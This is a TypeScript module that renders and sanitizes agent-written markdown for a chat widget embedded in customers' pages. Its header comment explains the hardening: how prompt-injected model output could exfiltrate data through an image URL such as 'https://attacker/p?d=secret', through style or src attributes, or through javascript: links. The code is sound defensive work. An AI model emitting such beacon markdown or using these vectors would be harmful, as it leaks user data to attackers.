// markdown.ts — Severable markdown core extracted from paw-enterprise's
// src/lib/components/chat/MarkdownRenderer.svelte (segment parser + renderMarkdown).
// Created 2026-07-15 (A3 glass bar). This sanitizes AGENT-AUTHORED markdown on a
// PUBLIC origin, so the DOMPurify allowlist below was copied VERBATIM from the
// source component; since 2026-09-26 it deliberately diverges (see below) —
// any unreviewed change is an XSS hole, so tests/markdown.spec.ts pins both
// arrays and they can't silently change.
//
// CUT from the source (concierge v1 is markdown-only, zero Ripple): the
// ui-spec / Ripple branch, @mention pills, mermaid, and syntax highlighting —
// code fences render as plain <pre> + a copy button (see CodeBlock.svelte).
// KEPT: gfm+breaks marked config, the sanitize allowlist (tightened 2026-09-26), the mobile
// table-wrapper, and the streaming unclosed-GENERIC-fence shimmer mask
// (findUnclosedFenceStart) so an in-flight ```code block doesn't leak raw
// backticks mid-stream. The ui-spec-specific JSON-brace mask is not ported —
// there are no ui-spec fences without Ripple.
//
// 2026-07-15 (C2 action loop): parseSegments now intercepts a ```pawbar-card
// fence (CARD_FENCE_LANG) BEFORE markdown render, emitting a `card` segment
// carrying the raw JSON. The card layer (lib/cards.ts + the card components)
// validates + renders it via Svelte props only — the DOMPurify path is
// untouched. A mid-stream unclosed card fence is shimmer-masked like any other.
//
// 2026-09-26 (reply links + model images): the allowlist is NO LONGER a
// verbatim copy of paw-enterprise's. That renderer runs on our own origin; this
// one runs in a cross-origin iframe on a customer's page, reading model output
// a prompt injection can steer. Four changes:
//   • Every surviving <a> is forced to target="_blank" rel="noopener noreferrer"
//     by an afterSanitizeAttributes hook, whatever the model wrote. `target`
//     used to pass through with any value, so `target="_top"` navigated the
//     customer's whole page away; and a plain [x](url) link, having no target,
//     loaded inside the 520px widget frame.
//   • Only http:, https:, mailto: and tel: hrefs survive; anything else
//     (relative, protocol-relative, ftp:, data:, javascript:) loses its href
//     and renders as inert text. Relative links would resolve against the
//     widget's origin, not the customer's site, so they are wrong either way.
//   • `img` is gone. A model-written image is a request fired on render, which
//     makes ![](https://attacker/p?d=secret) an exfiltration beacon. Markdown
//     images render as their escaped ALT TEXT (least surprising: the sentence
//     still reads, and [![Logo](img)](url) degrades to an ordinary link). Raw
//     <img> HTML is simply dropped by the tag allowlist.
//   • Attributes are an explicit ALLOWED_ATTR list instead of DOMPurify's
//     defaults + ADD_ATTR. The defaults include style (background:url(...)),
//     src (<input type=image src>) and background (<td background>) — each a
//     beacon by another name.
// The hook lives on a PRIVATE DOMPurify instance so it cannot leak into any
// other sanitize call; the image renderer lives on a private Marked instance
// so the global `marked` is untouched. Product-card image_url (lib/cards.ts)
// is a separate, Svelte-bound path and is not affected.

import { Marked } from 'marked';
import DOMPurify from 'dompurify';

// ── DOMPurify allowlist — this app's own, pinned by tests/markdown.spec.ts ───
// Do NOT edit without updating that pin. These are the ONLY tags/attributes
// that survive sanitization of agent markdown.
export const MARKDOWN_ALLOWED_TAGS = [
  'p', 'br', 'strong', 'em', 'del', 'a', 'ul', 'ol', 'li',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote',
  'table', 'thead', 'tbody', 'tr', 'th', 'td',
  'code', 'pre', 'hr', 'sup', 'sub', 'span', 'div',
  'input', // GFM task-list checkboxes
] as const;

// Exactly what marked emits on this path (fences are intercepted upstream):
// href/title on links, align on table cells, start on <ol>, type/disabled/
// checked on task-list checkboxes. colspan/rowspan/scope keep merged-cell
// tables intact. target/rel are deliberately absent — the link hook is their
// only writer.
export const MARKDOWN_ALLOWED_ATTR = [
  'href', 'title', 'align', 'start', 'type', 'disabled', 'checked', 'colspan', 'rowspan', 'scope',
] as const;

const SAFE_LINK_PROTOCOLS = new Set(['http:', 'https:', 'mailto:', 'tel:']);

function isSafeHref(href: string): boolean {
  try {
    // No base URL: relative and protocol-relative hrefs throw and are dropped.
    return SAFE_LINK_PROTOCOLS.has(new URL(href).protocol);
  } catch {
    return false;
  }
}

function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// Private marked instance: images render as escaped alt text, never <img>.
const markdown = new Marked({
  async: false,
  gfm: true,
  breaks: true,
  renderer: {
    image({ text }) {
      return escapeHtml(text);
    },
  },
});

let purifier: ReturnType<typeof DOMPurify> | null = null;

// Private DOMPurify instance (created lazily, once a window exists) carrying
// the link hook, so no other sanitize call in the bundle inherits it.
function getPurifier(): ReturnType<typeof DOMPurify> {
  if (purifier) return purifier;
  const p = DOMPurify(window);
  p.addHook('afterSanitizeAttributes', (node) => {
    if (node.nodeName !== 'A') return;
    const href = node.getAttribute('href');
    if (href !== null && !isSafeHref(href)) node.removeAttribute('href');
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  });
  purifier = p;
  return p;
}

export type Segment =
  | { type: 'html'; html: string }
  | { type: 'code'; code: string; lang: string }
  | { type: 'card'; json: string }
  | { type: 'code-loading' };

/** Fence language that carries an agent-authored action card. Intercepted
 *  BEFORE markdown render and parsed as JSON into native glass components
 *  (Svelte props only) — it never touches the DOMPurify/markdown path. */
export const CARD_FENCE_LANG = 'pawbar-card';

export function renderMarkdown(text: string): string {
  // gfm + breaks: turn on GitHub Flavored Markdown extras (tables,
  // strikethrough, autolinks, task lists) and treat single newlines as
  // <br> so multi-line replies look the way users typed them.
  const raw = markdown.parse(text) as string;
  const sanitized = getPurifier().sanitize(raw, {
    ALLOWED_ATTR: [...MARKDOWN_ALLOWED_ATTR],
    ALLOWED_TAGS: [...MARKDOWN_ALLOWED_TAGS],
  });
  // Wrap tables in a scrollable container for mobile.
  return sanitized
    .replace(/<table/g, '<div class="pawbar-table-wrapper"><table')
    .replace(/<\/table>/g, '</table></div>');
}

/** Return the index of the opener of a still-open triple-backtick fence in
 *  ``text``, or -1. Scans line-anchored fence markers in order (inline
 *  backticks in prose don't trigger), toggling open/closed as they pair up.
 *  Only EXTRACTOR-SHAPED openers — ``` plus an optional `[\w#+.-]*` tag,
 *  i.e. what the code-fence regex will extract once the closing fence arrives —
 *  report a hit. Copied verbatim from MarkdownRenderer.svelte. */
function findUnclosedFenceStart(text: string): number {
  const marker = /(?:^|\r?\n)(```[^\n]*)/g;
  let openIdx = -1;
  let openIsExtractable = false;
  let m;
  while ((m = marker.exec(text)) !== null) {
    if (openIdx === -1) {
      openIdx = m.index + m[0].length - m[1].length;
      openIsExtractable = /^```[\w#+.-]*$/.test(m[1].replace(/\r$/, ''));
    } else {
      openIdx = -1;
    }
  }
  return openIdx !== -1 && openIsExtractable ? openIdx : -1;
}

/** Split streamed/finished content into renderable segments: sanitized-HTML
 *  runs interleaved with fenced code blocks. While ``streaming``, an in-flight
 *  unclosed generic fence is masked as a single ``code-loading`` shimmer so raw
 *  backticks never flash in the bubble. Adapted from MarkdownRenderer.svelte's
 *  ``segments`` derivation, with the ui-spec branch removed. */
export function parseSegments(content: string, streaming = false): Segment[] {
  if (!content) return [];

  const result: Segment[] = [];
  // Language class includes `#`, `+`, `.` so ```c++ / ```c# / ```objective-c++
  // and dotted tags extract instead of leaking to marked; `\r?\n` tolerates CRLF.
  const codeBlockRegex = /```([\w#+.-]*)\r?\n([\s\S]*?)```/g;
  let lastIndex = 0;
  let match;

  while ((match = codeBlockRegex.exec(content)) !== null) {
    if (match.index > lastIndex) {
      const html = renderMarkdown(content.slice(lastIndex, match.index));
      if (html.trim()) result.push({ type: 'html', html });
    }
    const lang = match[1] || '';
    // Normalize interior CRLF so copy-to-clipboard never carries `\r`.
    const code = match[2].replace(/\r\n/g, '\n').trimEnd();
    if (lang === CARD_FENCE_LANG) {
      // Intercept before markdown: hand the raw JSON to the card layer, which
      // validates it (cards.parseCard) and renders via Svelte props only.
      result.push({ type: 'card', json: code });
    } else {
      result.push({ type: 'code', lang, code });
    }
    lastIndex = match.index + match[0].length;
  }

  if (lastIndex < content.length) {
    const remaining = content.slice(lastIndex);
    const maskStart = streaming ? findUnclosedFenceStart(remaining) : -1;
    if (maskStart !== -1) {
      const before = remaining.slice(0, maskStart);
      if (before.trim()) {
        const html = renderMarkdown(before);
        if (html.trim()) result.push({ type: 'html', html });
      }
      result.push({ type: 'code-loading' });
    } else {
      const html = renderMarkdown(remaining);
      if (html.trim()) result.push({ type: 'html', html });
    }
  }

  return result;
}
